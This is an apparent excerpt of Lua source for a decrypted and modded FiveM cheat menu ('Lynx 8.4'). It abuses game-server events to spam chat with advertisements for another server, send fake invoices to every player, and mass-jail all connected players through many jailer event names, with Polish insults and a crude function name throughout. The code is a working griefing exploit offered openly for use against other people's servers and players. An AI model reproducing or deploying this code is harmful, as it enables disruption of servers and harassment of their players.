...
av('Lynx 8.4 decrypted and modded by yunglean_#3904', true)
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '/ooc mango topka przepraszam wszystkich',
            {
                141,
                211,
                255
            },
            '^' .. bD .. 'mango topka przepraszam wszystkich'
        )
    end
    Citizen.CreateThread(
        function()
        ...
        while bw do
            ...
            if blowall then
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'mango topka przepraszam wszystkich',
                        {
                            141,
                            211,
                            255
                    ...
                    function()
                        ...
                        for i = 0, 128 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Dostales fakture dzieki mangorp.com',
                                4316133778
                            )
...
Citizen.CreateThread(
    function()
        ...
        LynxEvo.SetSubTitle('LynxX', 'yunglean_')
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('LynxX') then
                ...
                av('Lynx 8.4 decrypted and modded by yunglean_#3904', false)
                av('Enjoy!', false)
            ...
            elseif LynxEvo.IsMenuOpened('Destroyer') then
                ...
                elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
                    ...
                    TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "--> mangorp.com najlepszy serwer roleplay <--", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> mangorp.com najlepszy serwer roleplay <--", 9999999999)
                    ...
                    TriggerServerEvent("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "--> mangorp.com <--?", 9333397)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "--> mangorp.com <--?", 9333397)
                    TriggerServerEvent("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "--> mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?", 9999999999)
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?", 9999999999)
                    TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "--> mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?")
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "--> mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?")
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
                    TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "--> mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?", 323434532532, securityToken)
                    TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "mangorp.com najlepszy serwer roleplay <-- PO CHUJ SPAMIŁES CWELU JEBANY?", 500324532)
                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "mangorp.com najlepszy serwer roleplay")
                    TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "mangorp.com <--- ;)")
                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
                    TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." japierdole jak jestescie w wiezienu to ten serwer ssie pale elo")                       TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> jebac ariesa kurwe ", 9999999999)
                    end
            ...
            elseif LynxEvo.IsMenuOpened('crds') then
                if LynxEvo.Button('~h~~p~#~s~ yunglean_~r~#3904~r~_ ~p~DEV') then
                    av('~h~~o~essa~s~.', false)
                    av('htfu?', false)
                    av('jol mnay', false)
                elseif LynxEvo.Button('~h~~p~#~s~ yunglean_~r~#3904~r~_ ~p~DEV') then
                elseif LynxEvo.Button('~h~~p~#~s~ yunglean_~r~#3904~r~_ ~p~DEV') then
                end
                LynxEvo.Display()
